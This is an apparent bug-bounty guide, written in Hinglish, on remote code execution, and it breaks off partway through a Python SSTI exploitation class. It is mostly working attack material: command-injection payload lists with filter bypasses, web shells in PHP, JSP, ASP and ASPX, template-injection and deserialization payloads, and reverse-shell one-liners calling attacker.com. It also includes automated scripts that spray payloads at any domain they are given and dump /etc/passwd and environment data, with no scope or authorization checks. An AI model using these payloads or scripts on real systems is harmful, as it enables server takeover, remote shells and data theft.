# 🚀 ELITE Remote Code Execution (RCE) - Various Attack Vectors

**Target:** Remote Code Execution (RCE) through various vectors
**Bounty Value:** $10,000-$100,000+ (Critical - Complete server compromise)
**Difficulty:** Elite Level
**Impact:** Full server takeover, data exfiltration, lateral movement

## 🎯 Overview
Remote Code Execution (RCE) hai **HIGHEST VALUE** vulnerability! Ek successful RCE se aap complete server compromise kar sakte ho. Real-world mein yeh $100,000+ tak ke bounties dilwa chuki hai! Yeh guide covers sabse advanced RCE techniques jo elite hackers use karte hain.

---

## 🔥 Phase 1: Understanding RCE Attack Vectors

### 1.1 RCE Categories

#### 🔴 Command Injection
```bash
# Basic command injection payloads
; ls -la
| ls -la
& ls -la
&& ls -la
|| ls -la
` ls -la `
$(ls -la)
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
; id
| id

# Advanced command injection with bypasses
;%20ls%20-la
|%20ls%20-la
;`ls -la`
;$(ls -la)
;{ls,-la}
;/bin/ls${IFS}-la
;ls${IFS}-la
;l\s${IFS}-l\a
;/???/??${IFS}-??
```

#### 🔵 Code Injection (PHP, Python, Node.js, etc.)
```php
# PHP Code Injection
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php `$_GET['cmd']`; ?>
<?php eval($_GET['code']); ?>
<?php assert($_GET['code']); ?>
<?php file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>'); ?>

# Python Code Injection
__import__('os').system('ls -la')
exec('import os; os.system("ls -la")')
eval('__import__("os").system("ls -la")')
compile('import os; os.system("ls -la")', '<string>', 'exec')

# Node.js Code Injection
require('child_process').exec('ls -la')
process.binding('spawn_sync').spawn({file: '/bin/ls', args: ['ls', '-la']})
global.process.mainModule.require('child_process').exec('ls -la')
```

#### 🟡 Template Injection (SSTI)
```python
# Jinja2 (Python Flask)
{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls -la")}}

# Smarty (PHP)
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",true)}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -la") }
```

#### 🟢 Deserialization RCE
```python
# Python Pickle
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('ls -la',))

pickle.dumps(RCE())

# Java Deserialization
# ysoserial payloads
java -jar ysoserial.jar CommonsCollections1 'ls -la'
java -jar ysoserial.jar CommonsCollections3 'whoami'
java -jar ysoserial.jar CommonsCollections5 'id'

# .NET Deserialization
# ysoserial.net payloads
ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -o base64 -c "calc"
```

#### 🟠 File Upload RCE
```php
# PHP Web Shell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

# JSP Web Shell
<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>

# ASP Web Shell
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
If (szCMD <> "") Then
    Set oExec = oScript.Exec(szCMD)
    Response.write(oExec.StdOut.ReadAll)
End If
%>
```

---

## 🛠️ Phase 2: Advanced RCE Detection Techniques

### 2.1 Command Injection Discovery
```bash
#!/bin/bash
# Save as rce_param_discovery.sh

TARGET_DOMAIN=$1
if [ -z "$TARGET_DOMAIN" ]; then
    echo "Usage: ./rce_param_discovery.sh target.com"
    exit 1
fi

echo "🔍 Discovering RCE-vulnerable parameters for $TARGET_DOMAIN"
mkdir -p rce_discovery
cd rce_discovery

# Step 1: Collect all URLs with parameters
echo "📡 Collecting URLs with parameters..."
echo $TARGET_DOMAIN | gau | grep "=" > urls_with_params.txt
echo $TARGET_DOMAIN | waybackurls | grep "=" >> urls_with_params.txt
cat urls_with_params.txt | sort -u > unique_urls_with_params.txt

# Step 2: Extract parameter names
echo "🔍 Extracting parameter names..."
cat unique_urls_with_params.txt | grep -oP '(?<=[\?&])[^=&]*(?==)' | sort -u > parameter_names.txt

# Step 3: Common RCE parameter names
cat > common_rce_params.txt << 'EOF'
cmd
command
exec
execute
run
system
shell
bash
sh
powershell
ps
terminal
console
cli
script
code
eval
function
method
action
operation
process
task
job
worker
handler
controller
service
api
endpoint
callback
hook
trigger
event
listener
observer
monitor
watch
track
trace
debug
test
check
validate
verify
scan
probe
ping
nslookup
dig
curl
wget
fetch
download
upload
file
path
dir
directory
folder
location
destination
source
target
input
output
data
content
payload
body
message
text
string
value
param
parameter
arg
argument
var
variable
field
column
key
name
id
user
admin
root
guest
public
private
internal
external
local
remote
host
server
client
domain
subdomain
url
uri
link
href
src
dest
from
to
in
out
stdin
stdout
stderr
pipe
redirect
forward
proxy
gateway
tunnel
bridge
relay
pass
through
via
over
under
around
across
along
between
among
within
without
inside
outside
before
after
above
below
left
right
up
down
north
south
east
west
top
bottom
front
back
head
tail
start
end
begin
finish
first
last
next
prev
previous
current
active
inactive
enabled
disabled
on
off
true
false
yes
no
ok
error
success
failure
pass
fail
win
lose
good
bad
valid
invalid
correct
incorrect
right
wrong
positive
negative
plus
minus
add
sub
subtract
mul
multiply
div
divide
mod
modulo
pow
power
sqrt
square
root
log
ln
exp
sin
cos
tan
abs
min
max
sum
avg
average
count
length
size
width
height
depth
volume
area
perimeter
radius
diameter
circumference
angle
degree
radian
pi
e
infinity
null
undefined
empty
blank
space
tab
newline
return
carriage
feed
form
page
line
word
char
character
byte
bit
EOF

# Step 4: Create comprehensive parameter list
cat parameter_names.txt common_rce_params.txt | sort -u > all_rce_params.txt

echo "✅ Found $(wc -l < all_rce_params.txt) potential RCE parameters"
```

### 2.2 Advanced RCE Payload Generation
```bash
#!/bin/bash
# Save as generate_rce_payloads.sh

echo "🔥 Generating advanced RCE payloads..."
mkdir -p rce_payloads

# Basic command injection payloads
cat > rce_payloads/basic_command_injection.txt << 'EOF'
; ls -la
| ls -la
& ls -la
&& ls -la
|| ls -la
` ls -la `
$(ls -la)
; cat /etc/passwd
| cat /etc/passwd
; whoami
| whoami
; id
| id
; uname -a
| uname -a
; pwd
| pwd
; ps aux
| ps aux
; netstat -an
| netstat -an
; ifconfig
| ifconfig
; env
| env
; history
| history
; w
| w
; who
| who
; last
| last
; df -h
| df -h
; mount
| mount
; lsof
| lsof
; ss -tuln
| ss -tuln
EOF

# Advanced command injection with bypasses
cat > rce_payloads/advanced_command_injection.txt << 'EOF'
;%20ls%20-la
|%20ls%20-la
;`ls -la`
;$(ls -la)
;{ls,-la}
;/bin/ls${IFS}-la
;ls${IFS}-la
;l\s${IFS}-l\a
;/???/??${IFS}-??
;echo${IFS}test
;cat${IFS}/etc/passwd
;w\hoami
;wh\oami
;who\ami
;/usr/bin/id
;/bin/id
;which${IFS}id
;type${IFS}id
;command${IFS}-v${IFS}id
;builtin${IFS}echo${IFS}test
;printf${IFS}test
;awk${IFS}'BEGIN{print"test"}'
;perl${IFS}-e${IFS}'print"test"'
;python${IFS}-c${IFS}'print("test")'
;ruby${IFS}-e${IFS}'puts"test"'
;php${IFS}-r${IFS}'echo"test";'
;node${IFS}-e${IFS}'console.log("test")'
EOF

# Time-based command injection
cat > rce_payloads/time_based_command_injection.txt << 'EOF'
; sleep 5
| sleep 5
& sleep 5
&& sleep 5
|| sleep 5
` sleep 5 `
$(sleep 5)
; ping -c 5 127.0.0.1
| ping -c 5 127.0.0.1
; timeout 5 sleep 10
| timeout 5 sleep 10
; /bin/sleep 5
| /bin/sleep 5
; sleep${IFS}5
| sleep${IFS}5
; s\leep${IFS}5
| s\leep${IFS}5
; /???/??eep${IFS}5
| /???/??eep${IFS}5
EOF

# Out-of-band command injection
cat > rce_payloads/oob_command_injection.txt << 'EOF'
; nslookup $(whoami).attacker.com
| nslookup $(whoami).attacker.com
; dig $(whoami).attacker.com
| dig $(whoami).attacker.com
; curl http://attacker.com/$(whoami)
| curl http://attacker.com/$(whoami)
; wget http://attacker.com/$(whoami)
| wget http://attacker.com/$(whoami)
; nc attacker.com 4444 -e /bin/bash
| nc attacker.com 4444 -e /bin/bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
| bash -i >& /dev/tcp/attacker.com/4444 0>&1
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
EOF

# PHP code injection payloads
cat > rce_payloads/php_code_injection.txt << 'EOF'
<?php system($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php `$_GET['cmd']`; ?>
<?php eval($_GET['code']); ?>
<?php assert($_GET['code']); ?>
<?php file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>'); ?>
<?php $a=$_GET['cmd'];system($a); ?>
<?php $b=base64_decode($_GET['cmd']);system($b); ?>
<?php eval(base64_decode($_GET['code'])); ?>
<?php eval(gzinflate(base64_decode($_GET['code']))); ?>
<?php eval(str_rot13($_GET['code'])); ?>
<?php $c=create_function('',$_GET['code']);$c(); ?>
<?php call_user_func($_GET['func'],$_GET['cmd']); ?>
<?php call_user_func_array($_GET['func'],array($_GET['cmd'])); ?>
EOF

# Python code injection payloads
cat > rce_payloads/python_code_injection.txt << 'EOF'
__import__('os').system('ls -la')
exec('import os; os.system("ls -la")')
eval('__import__("os").system("ls -la")')
compile('import os; os.system("ls -la")', '<string>', 'exec')
__import__('subprocess').call(['ls', '-la'])
__import__('subprocess').Popen(['ls', '-la'])
__import__('subprocess').run(['ls', '-la'])
__import__('subprocess').check_output(['ls', '-la'])
__import__('os').popen('ls -la').read()
__import__('commands').getoutput('ls -la')
__import__('commands').getstatusoutput('ls -la')
eval("__import__('os').system('ls -la')")
exec("__import__('os').system('ls -la')")
compile("__import__('os').system('ls -la')", "", "exec")
EOF

# Node.js code injection payloads
cat > rce_payloads/nodejs_code_injection.txt << 'EOF'
require('child_process').exec('ls -la')
require('child_process').spawn('ls', ['-la'])
require('child_process').spawnSync('ls', ['-la'])
require('child_process').execSync('ls -la')
require('child_process').execFile('/bin/ls', ['-la'])
require('child_process').execFileSync('/bin/ls', ['-la'])
require('child_process').fork('ls')
process.binding('spawn_sync').spawn({file: '/bin/ls', args: ['ls', '-la']})
global.process.mainModule.require('child_process').exec('ls -la')
global.process.mainModule.constructor._load('child_process').exec('ls -la')
this.constructor.constructor('return process')().mainModule.require('child_process').exec('ls -la')
EOF

# Template injection payloads
cat > rce_payloads/template_injection.txt << 'EOF'
# Jinja2 (Python Flask)
{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].system('ls -la')}}
{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('ls -la')}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("ls -la")}}
{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("whoami")}}

# Smarty (PHP)
{php}echo `id`;{/php}
{php}system('ls -la');{/php}
{php}exec('whoami');{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",true)}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("ls -la") }
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }

# Velocity (Java)
#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('id'))
#set($ex=$class.forName('java.lang.Runtime').getRuntime().exec('ls -la'))

# Thymeleaf (Java)
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec('ls -la')}
EOF

# File upload RCE payloads
cat > rce_payloads/file_upload_rce.txt << 'EOF'
# PHP Web Shells
<?php system($_GET['cmd']); ?>
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
<?php eval($_POST['code']); ?>
<?php $a=$_GET['a']; if($a) system($a); ?>

# JSP Web Shells
<%@ page import="java.util.*,java.io.*"%><%if (request.getParameter("cmd") != null) {Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}}%>

# ASP Web Shells
<%Set oScript = Server.CreateObject("WSCRIPT.SHELL")Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")szCMD = request("cmd")If (szCMD <> "") ThenSet oExec = oScript.Exec(szCMD)Response.write(oExec.StdOut.ReadAll)End If%>

# ASPX Web Shells
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string ExcuteCmd(string arg) {ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void Page_Load(object sender, EventArgs e) {Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(Request.Params["cmd"])));Response.Write("</pre>");}%>
EOF

# Combine all payloads
cat rce_payloads/*.txt | sort -u > rce_payloads/all_rce_payloads.txt

echo "✅ Generated $(wc -l < rce_payloads/all_rce_payloads.txt) RCE payloads"
```

### 2.3 Elite RCE Testing Automation
```bash
#!/bin/bash
# Save as elite_rce_tester.sh

TARGET_DOMAIN=$1
if [ -z "$TARGET_DOMAIN" ]; then
    echo "Usage: ./elite_rce_tester.sh target.com"
    exit 1
fi

echo "🚀 ELITE RCE TESTING STARTED FOR $TARGET_DOMAIN"
mkdir -p rce_results
cd rce_results

# Step 1: Discover parameters
echo "🔍 Step 1: Parameter discovery..."
../rce_param_discovery.sh $TARGET_DOMAIN

# Step 2: Generate payloads
echo "🔥 Step 2: Payload generation..."
../generate_rce_payloads.sh

# Step 3: Basic command injection testing
echo "🧪 Step 3: Basic command injection testing..."
while read url; do
    echo "Testing URL: $url"
    
    # Extract base URL and parameters
    base_url=$(echo $url | cut -d'?' -f1)
    params=$(echo $url | cut -d'?' -f2)
    
    # Test each parameter
    echo $params | tr '&' '
' | while read param; do
        param_name=$(echo $param | cut -d'=' -f1)
        param_value=$(echo $param | cut -d'=' -f2)
        
        echo "  Testing parameter: $param_name"
        
        # Test basic command injection payloads
        while read payload; do
            # URL encode the payload
            encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))")
            
            # Create test URL
            test_url="${base_url}?${param_name}=${encoded_payload}"
            
            # Make request and check response
            response=$(curl -s -L -m 10 "$test_url" 2>/dev/null)
            
            # Check for command execution indicators
            if echo "$response" | grep -qi "root:\|bin/bash\|uid=\|gid=\|groups=\|total \|drwx\|/etc/passwd\|/bin/sh"; then
                echo "🚨 POTENTIAL COMMAND INJECTION FOUND!"
                echo "URL: $test_url" >> command_injection_findings.txt
                echo "Payload: $payload" >> command_injection_findings.txt
                echo "Response: $(echo $response | head -c 500)" >> command_injection_findings.txt
                echo "---" >> command_injection_findings.txt
            fi
            
        done < ../rce_payloads/basic_command_injection.txt
        
    done
    
done < ../rce_discovery/unique_urls_with_params.txt

# Step 4: Time-based command injection testing
echo "🧪 Step 4: Time-based command injection testing..."
while read url; do
    echo "Testing URL: $url"
    
    # Extract base URL and parameters
    base_url=$(echo $url | cut -d'?' -f1)
    params=$(echo $url | cut -d'?' -f2)
    
    # Test each parameter
    echo $params | tr '&' '
' | while read param; do
        param_name=$(echo $param | cut -d'=' -f1)
        
        echo "  Testing parameter: $param_name"
        
        # Test time-based payloads
        while read payload; do
            # URL encode the payload
            encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload', safe=''))")
            
            # Create test URL
            test_url="${base_url}?${param_name}=${encoded_payload}"
            
            # Measure response time
            start_time=$(date +%s.%N)
            response=$(curl -s -L -m 15 "$test_url" 2>/dev/null)
            end_time=$(date +%s.%N)
            
            # Calculate response time
            response_time=$(echo "$end_time - $start_time" | bc)
            
            # Check if response time indicates command injection
            if (( $(echo "$response_time > 4.5" | bc -l) )); then
                echo "🚨 POTENTIAL TIME-BASED COMMAND INJECTION FOUND!"
                echo "URL: $test_url" >> time_based_rce_findings.txt
                echo "Response Time: ${response_time}s" >> time_based_rce_findings.txt
                echo "Payload: $payload" >> time_based_rce_findings.txt
                echo "---" >> time_based_rce_findings.txt
            fi
            
        done < ../rce_payloads/time_based_command_injection.txt
        
    done
    
done < ../rce_discovery/unique_urls_with_params.txt

# Step 5: Code injection testing
echo "🧪 Step 5: Code injection testing..."
while read url; do
    echo "Testing URL: $url"
    
    # Extract base URL and parameters
    base_url=$(echo $url | cut -d'?' -f1)
    params=$(echo $url | cut -d'?' -f2)
    
    # Test each parameter
    echo $params | tr '&' '
' | while read param; do
        param_name=$(echo $param | cut -d'=' -f1)
        
        echo "  Testing parameter: $param_name"
        
        # Test PHP code injection
        php_payload="<?php echo 'RCE_TEST_'.md5('test'); ?>"
        encoded_php_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$php_payload', safe=''))")
        test_url="${base_url}?${param_name}=${encoded_php_payload}"
        response=$(curl -s -L -m 10 "$test_url" 2>/dev/null)
        
        if echo "$response" | grep -q "RCE_TEST_098f6bcd4621d373cade4e832627b4f6"; then
            echo "🚨 POTENTIAL PHP CODE INJECTION FOUND!"
            echo "URL: $test_url" >> php_code_injection_findings.txt
            echo "Payload: $php_payload" >> php_code_injection_findings.txt
            echo "Response: $(echo $response | grep -o 'RCE_TEST_[a-f0-9]*')" >> php_code_injection_findings.txt
            echo "---" >> php_code_injection_findings.txt
        fi
        
        # Test Python code injection
        python_payload="__import__('hashlib').md5(b'test').hexdigest()"
        encoded_python_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$python_payload', safe=''))")
        test_url="${base_url}?${param_name}=${encoded_python_payload}"
        response=$(curl -s -L -m 10 "$test_url" 2>/dev/null)
        
        if echo "$response" | grep -q "098f6bcd4621d373cade4e832627b4f6"; then
            echo "🚨 POTENTIAL PYTHON CODE INJECTION FOUND!"
            echo "URL: $test_url" >> python_code_injection_findings.txt
            echo "Payload: $python_payload" >> python_code_injection_findings.txt
            echo "Response: $(echo $response | grep -o '098f6bcd4621d373cade4e832627b4f6')" >> python_code_injection_findings.txt
            echo "---" >> python_code_injection_findings.txt
        fi
        
    done
    
done < ../rce_discovery/unique_urls_with_params.txt

echo "✅ RCE testing completed! Check rce_results/ for findings."
```

---

## 🎯 Phase 3: Manual Advanced RCE Testing

### 3.1 Advanced Command Injection Exploitation
```python
#!/usr/bin/env python3
# Save as advanced_command_injection.py

import requests
import time
import base64
import sys
import urllib.parse

class AdvancedCommandInjection:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
        
    def test_basic_injection(self):
        """Test basic command injection"""
        print(f"🧪 Testing basic command injection on {self.param_name}")
        
        test_payloads = [
            "; whoami",
            "| whoami", 
            "&& whoami",
            "|| whoami",
            "`whoami`",
            "$(whoami)"
        ]
        
        for payload in test_payloads:
            response = self.make_request(payload)
            if response and self.check_command_execution(response.text, ["root", "www-data", "apache", "nginx", "user"]):
                print(f"✅ Basic command injection confirmed with payload: {payload}")
                return True, payload
        
        return False, None
    
    def test_blind_injection(self):
        """Test blind command injection using time delays"""
        print(f"🧪 Testing blind command injection on {self.param_name}")
        
        test_payloads = [
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5", 
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)"
        ]
        
        for payload in test_payloads:
            start_time = time.time()
            response = self.make_request(payload)
            end_time = time.time()
            
            response_time = end_time - start_time
            if response_time >= 4.5:  # Allow some tolerance
                print(f"✅ Blind command injection confirmed with payload: {payload} (Response time: {response_time:.2f}s)")
                return True, payload
        
        return False, None
    
    def test_out_of_band_injection(self, callback_domain):
        """Test out-of-band command injection"""
        print(f"🧪 Testing out-of-band command injection on {self.param_name}")
        
        test_payloads = [
            f"; nslookup $(whoami).{callback_domain}",
            f"| nslookup $(whoami).{callback_domain}",
            f"; dig $(whoami).{callback_domain}",
            f"| dig $(whoami).{callback_domain}",
            f"; curl http://{callback_domain}/$(whoami)",
            f"| curl http://{callback_domain}/$(whoami)"
        ]
        
        for payload in test_payloads:
            response = self.make_request(payload)
            print(f"Sent OOB payload: {payload}")
            print("Check your callback server for incoming requests")
        
        return True, test_payloads[0]  # Assume success for OOB
    
    def bypass_filters(self, base_payload):
        """Try various bypass techniques"""
        print(f"🔥 Attempting filter bypasses for: {base_payload}")
        
        bypass_techniques = [
            # Space bypasses
            base_payload.replace(" ", "${IFS}"),
            base_payload.replace(" ", "%20"),
            base_payload.replace(" ", "	"),
            base_payload.replace(" ", "%09"),
            
            # Command bypasses
            base_payload.replace("whoami", "w\hoami"),
            base_payload.replace("whoami", "/usr/bin/whoami"),
            base_payload.replace("whoami", "`which whoami`"),
            
            # Encoding bypasses
            f"; echo {base64.b64encode(b'whoami').decode()} | base64 -d | sh",
            f"| echo {base64.b64encode(b'whoami').decode()} | base64 -d | sh",
            
            # Alternative commands
            base_payload.replace("whoami", "id"),
            base_payload.replace("whoami", "uname -a"),
            base_payload.replace("whoami", "pwd"),
            
            # Concatenation bypasses
            "; who'am'i",
            "| who'am'i",
            '; who"am"i',
            '| who"am"i',
            
            # Variable bypasses
            "; a=who;b=ami;$a$b",
            "| a=who;b=ami;$a$b"
        ]
        
        for bypass_payload in bypass_techniques:
            response = self.make_request(bypass_payload)
            if response and self.check_command_execution(response.text, ["root", "www-data", "apache", "nginx", "user", "uid=", "gid="]):
                print(f"✅ Filter bypass successful with: {bypass_payload}")
                return True, bypass_payload
        
        return False, None
    
    def make_request(self, payload):
        """Make HTTP request with payload"""
        params = {self.param_name: payload}
        try:
            response = self.session.get(self.target_url, params=params, timeout=15)
            return response
        except:
            return None
    
    def check_command_execution(self, response_text, indicators):
        """Check if command was executed based on response"""
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return True
        return False
    
    def exploit_command_injection(self, working_payload):
        """Exploit confirmed command injection"""
        print(f"🚀 Exploiting command injection with payload: {working_payload}")
        
        commands_to_run = [
            "whoami",
            "id", 
            "uname -a",
            "pwd",
            "ls -la",
            "cat /etc/passwd",
            "ps aux",
            "netstat -an",
            "ifconfig",
            "env"
        ]
        
        results = {}
        
        for cmd in commands_to_run:
            exploit_payload = working_payload.replace("whoami", cmd).replace("sleep 5", cmd)
            response = self.make_request(exploit_payload)
            
            if response:
                results[cmd] = response.text
                print(f"Command '{cmd}' executed successfully")
            else:
                print(f"Command '{cmd}' failed")
        
        return results

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 advanced_command_injection.py <target_url> <param_name> [callback_domain]")
        sys.exit(1)
    
    target_url = sys.argv[1]
    param_name = sys.argv[2]
    callback_domain = sys.argv[3] if len(sys.argv) > 3 else None
    
    injector = AdvancedCommandInjection(target_url, param_name)
    
    print("🚀 Starting Advanced Command Injection Testing")
    
    # Test basic injection
    basic_success, basic_payload = injector.test_basic_injection()
    
    if basic_success:
        print(f"
🚨 COMMAND INJECTION CONFIRMED!")
        print(f"Vulnerable parameter: {param_name}")
        print(f"Working payload: {basic_payload}")
        
        # Exploit the vulnerability
        results = injector.exploit_command_injection(basic_payload)
        
        # Save results
        with open('command_injection_results.txt', 'w') as f:
            f.write(f"Target: {target_url}
")
            f.write(f"Parameter: {param_name}
")
            f.write(f"Payload: {basic_payload}

")
            
            for cmd, output in results.items():
                f.write(f"Command: {cmd}
")
                f.write(f"Output:
{output}
")
                f.write("-" * 50 + "
")
        
        print(f"
💰 Potential Bounty Value: $10,000-$100,000+")
        print("📁 Results saved to command_injection_results.txt")
        
    else:
        # Test blind injection
        blind_success, blind_payload = injector.test_blind_injection()
        
        if blind_success:
            print(f"
🚨 BLIND COMMAND INJECTION CONFIRMED!")
            print(f"Vulnerable parameter: {param_name}")
            print(f"Working payload: {blind_payload}")
            
            # Try filter bypasses
            bypass_success, bypass_payload = injector.bypass_filters(blind_payload)
            
            if bypass_success:
                results = injector.exploit_command_injection(bypass_payload)
                print(f"
💰 Potential Bounty Value: $10,000-$100,000+")
            else:
                print(f"
💰 Potential Bounty Value: $5,000-$25,000+ (Blind RCE)")
        
        elif callback_domain:
            # Test out-of-band injection
            oob_success, oob_payload = injector.test_out_of_band_injection(callback_domain)
            print(f"
💰 Potential Bounty Value: $5,000-$25,000+ (OOB RCE)")
        
        else:
            print("❌ No command injection vulnerability detected")

if __name__ == "__main__":
    main()
```

### 3.2 Advanced Template Injection (SSTI) Exploitation
```python
#!/usr/bin/env python3
# Save as advanced_ssti_exploitation.py

import requests
import sys
import urllib.parse
import base64

class AdvancedSSTI:
    def __init__(self, target_url, param_name):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
        
    def detect_template_engine(self):
        """Detect which template engine is being used"""
        print("🔍 Detecting template engine...")
        
        detection_payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{request}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self}}',
                '{{app}}'
            ],
            'smarty': [
                '{7*7}',
                '{$smarty}',
                '{php}echo 1;{/php}'
            ],
            'freemarker': [
                '${7*7}',
                '${.version}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>'
            ],
            'velocity': [
                '#set($x=7*7)$x',
                '$class',
                '#foreach'
            ],
            'thymeleaf': [
                '${7*7}',
                '${T(java.lang.System).getProperty("java.version")}',
                '${@environment}'
            ]
        }
        
        for engine, payloads in detection_payloads.items():
            for payload in payloads:
                response = self.make_request(payload)
                if response:
                    if engine == 'jinja2' and ('49' in response.text or 'config' in response.text.lower()):
                        print(f"✅ Detected template engine: {engine}")
                        return engine
                    elif engine == 'twig' and ('49' in response.text or 'twig' in response.text.lower()):
                        print(f"✅ Detected template engine: {engine}")
                        return engine
                    elif engine == 'smarty' and ('49' in response.text or 'smarty' in response.text.lower()):
                        print(f"✅ Detected template engine: {engine}")
                        return engine
                    elif engine == 'freemarker' and ('49' in response.text or 'freemarker' in response.text.lower()):
                        print(f"✅ Detected template engine: {engine}")
                        return engine
                    elif engine == 'velocity' and ('49' in response.text or 'velocity' in response.text.lower()):
                        print(f"✅ Detected template engine: {engine}")
                        return engine
                    elif engine == 'thymeleaf' and ('49' in response.text or 'java' in response.text.lower()):
                        print(f"✅ Detected template engine: {engine}")
                        return engine
        
        print("❌ Could not detect template engine")
        return None
    
    def exploit_jinja2(self):
        """Exploit Jinja2 SSTI"""
        print("🚀 Exploiting Jinja2 SSTI...")
        
        rce_payloads = [
            "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].system('ls -la')}}",
            "{{''.__class__.__mro__[2].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')}}"
        ]
        
        for payload in rce_payloads:
            response = self.make_request(payload)
            if response and self.check_rce_success(response.text):
                print(f"✅ Jinja2 RCE successful with payload: {payload}")
                return True, payload
        
        return False, None
    
    def exploit_twig(self):
        """Exploit Twig SSTI"""
        print("🚀 Exploiting Twig SSTI...")
        
        rce_payloads = [
            '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}',
            '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
            '{{_self.env.registerUndefinedFilterCallback("passthru")}}{{_self.env.getFilter("ls -la")}}'
        ]
        
        for payload in rce_payloads:
            response = self.make_request(payload)
            if response and self.check_rce_success(response.text):
                print(f"✅ Twig RCE successful with payload: {payload}")
                return True, payload
        
        return False, None
    
    def exploit_smarty(self):
        """Exploit Smarty SSTI"""
        print("🚀 Exploiting Smarty SSTI...")
        
        rce_payloads = [
